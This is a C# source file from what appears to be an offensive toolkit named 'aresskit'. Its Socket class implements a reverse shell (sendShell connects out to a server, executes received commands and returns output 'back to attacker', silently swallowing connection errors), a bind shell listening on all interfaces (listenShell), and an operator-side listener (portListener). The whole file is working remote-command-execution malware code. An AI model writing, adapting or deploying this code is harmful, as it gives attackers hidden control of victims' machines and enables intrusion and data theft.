using System;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace aresskit
{
    class Socket
    {
        public static string shellcode_ = Directory.GetCurrentDirectory() + "> ";
        public static byte[] shellcode = System.Text.Encoding.ASCII.GetBytes(shellcode_);

        public void sendShell(string server, int port)
        {
            try
            {
                TcpClient client = new TcpClient(server, port);
                NetworkStream stream = client.GetStream();

                while (true)
                {
                    // Send the message to the connected TcpServer. 
                    stream.Write(shellcode, 0, shellcode.Length); // Send Shellcode

                    // Buffer to store the response bytes.
                    byte[] data = new byte[256];

                    // String to store the response ASCII representation.
                    string responseData = "";

                    // Read the first batch of the TcpServer response bytes.
                    int bytes = stream.Read(data, 0, data.Length);
                    responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);

                    if (responseData == "exit")
                    {
                        break;
                    }
                    else
                    {
                        byte[] output = System.Text.Encoding.ASCII.GetBytes(Toolkit.exec(responseData));
                        try
                        {
                            stream.Write(output, 0, output.Length); // Send output of command back to attacker.
                        }
                        catch (IOException)
                        {
                            stream.Close();
                            client.Close();
                            break;
                        }
                    }
                }

                // Close everything.
                stream.Close();
                client.Close();
            }
            catch (SocketException) { } // Pass socket connection silently.

            // Console.WriteLine("\n Press Enter to continue...");
            // Console.Read();
        }

        public void listenShell(int port)
        {
            TcpListener server = null;
            try
            {
                // TcpListener server = new TcpListener(port);
                server = new TcpListener(IPAddress.Any, port);

                // Start listening for client requests.
                server.Start();

                // Buffer for reading data
                Byte[] bytes = new Byte[256];
                String data = null;

                // Enter the listening loop.
                while (true)
                {
                    Console.WriteLine("Open Shell - Listening on {0}", port.ToString());

                    // Perform a blocking call to accept requests.
                    // You could also user server.AcceptSocket() here.
                    TcpClient client = server.AcceptTcpClient();

                    // Get a stream object for reading and writing
                    NetworkStream stream = client.GetStream();

                    stream.Write(shellcode, 0, shellcode.Length);

                    data = null;

                    // Get a stream object for reading and writing

                    int i;

                    // Loop to receive all the data sent by the client.
                    while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                    {
                        // Translate data bytes to a ASCII string.
                        data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                        // Console.WriteLine("Received: {0}", data);
                        string output_ = Toolkit.exec(data); // execute command

                        // Get bytes of Output
                        byte[] output = System.Text.Encoding.ASCII.GetBytes(output_);

                        // Process the data sent by the client.
                        data = data.ToUpper();

                        // byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);

                        // Send back a response.
                        try
                        {
                            stream.Write(output, 0, output.Length); // Write command output to TCP stream
                            stream.Write(shellcode, 0, shellcode.Length); // Send back shellcode prompt
                        }
                        catch
                        {
                            Console.WriteLine("Connection closed.");
                        }
                        // Console.WriteLine("Sent: {0}", data);
                    }

                    // Shutdown and end connection
                    client.Close();
                }
            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: {0}", e);
            }
            finally
            {
                // Stop listening for new clients.
                server.Stop();
            }
        }

        public void portListener(int port, string type_)
        {
            string type = type_.ToLower();
            if (type == "tcp")
            {
                TcpListener server = new TcpListener(IPAddress.Any, port);
                try
                {
                    // Start listening for client requests.
                    server.Start();

                    // Buffer for reading data
                    Byte[] bytes = new Byte[256];
                    String data = null;

                    // Enter the listening loop.
                    while (true)
                    {
                        Console.WriteLine("TCP Port - Listening on {0}", port.ToString());

                        // Perform a blocking call to accept requests.
                        // You could also user server.AcceptSocket() here.
                        TcpClient client = server.AcceptTcpClient();
                        Console.WriteLine("Master 1 Connected.");

                        // Get a stream object for reading and writing
                        NetworkStream stream = client.GetStream();

                        data = null;

                        int i;

                        // Loop to receive all the data sent by the client.
                        while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                        {
                            // Translate data bytes to a ASCII string.
                            data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                            Console.Write(data);

                            // Get bytes of Output
                            byte[] msg = System.Text.Encoding.ASCII.GetBytes(Console.ReadLine());

                            // Process the data sent by the client.
                            data = data.ToUpper();

                            // byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);

                            // Send back a response.
                            try
                            {
                                stream.Write(msg, 0, msg.Length); // Write command output to TCP stream
                            }
                            catch
                            {
                                Console.WriteLine("Connection closed.");
                            }
                            // Console.WriteLine("Sent: {0}", data);
                        }

                        // Shutdown and end connection
                        client.Close();
                    }
                }
                catch (SocketException e)
                {
                    Console.WriteLine("SocketException: {0}", e);
                }
                finally
                {
                    // Stop listening for new clients.
                    server.Stop();
                }
            }
        }
    }
}
